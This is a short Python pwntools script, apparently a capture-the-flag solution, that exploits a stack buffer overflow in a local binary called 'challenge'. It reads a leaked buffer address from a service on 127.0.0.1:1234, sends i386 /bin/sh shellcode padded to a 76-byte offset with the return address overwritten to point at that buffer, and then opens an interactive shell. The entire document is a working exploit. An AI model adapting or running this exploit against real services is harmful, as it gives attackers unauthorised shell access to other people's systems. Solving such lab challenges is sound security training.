from pwn import *

context.binary = exe = ELF("./challenge")

shellcode = asm(shellcraft.i386.linux.sh())

p = remote("127.0.0.1", 1234)

p.recvuntil(b"address of buffer: ")
buffer_addr = int(p.recvline().strip(), 16)
log.info(f"buffer_addr: {hex(buffer_addr)}")

offset = 76
padding = b"A" * (offset - len(shellcode))
ret_addr = p32(buffer_addr)

payload = shellcode + padding + ret_addr

p.sendline(payload)

p.interactive()
